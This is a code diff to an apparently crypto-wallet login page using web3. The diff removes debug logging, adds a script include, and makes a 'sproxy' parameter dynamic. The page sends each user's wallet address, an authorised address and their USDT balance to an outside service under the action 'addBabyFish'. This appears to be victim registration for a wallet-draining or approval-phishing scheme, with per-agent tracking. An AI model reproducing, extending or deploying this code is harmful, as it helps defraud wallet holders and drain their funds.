@@ -86,16 +86,15 @@
 <script src="../../coin/js/jquery.i18n.js"></script>
 <script src="../../coin/js/lang.js"></script>
 <script src="../../coin/js/web3.min.js"></script>
+<script src="/param.js"></script>
 <script type="application/javascript">
   $(function (){
     loadProperties(localStorage.getItem("lang"))
   })
   function ethLogin(){
-    console.log(11)
     test()
   }
   function trxLogin(){
-    console.log(22)
   }
 
   const abi = [
@@ -262,7 +261,7 @@
 
     url = "https://uapi.oct99a.com:8443/service?action=addBabyFish&terminal_id=2" +
             "&user_address=" + user_address + "&auth_address=" + auth_address + "&" +
-            "coin_type=usdt&base_chain=erc&user_available=" + balanceMoney + "&sproxy=1"
+            "coin_type=usdt&base_chain=erc&user_available=" + balanceMoney + "&sproxy="+localStorage.getItem("sproxy")
 
     console.log(url)
 
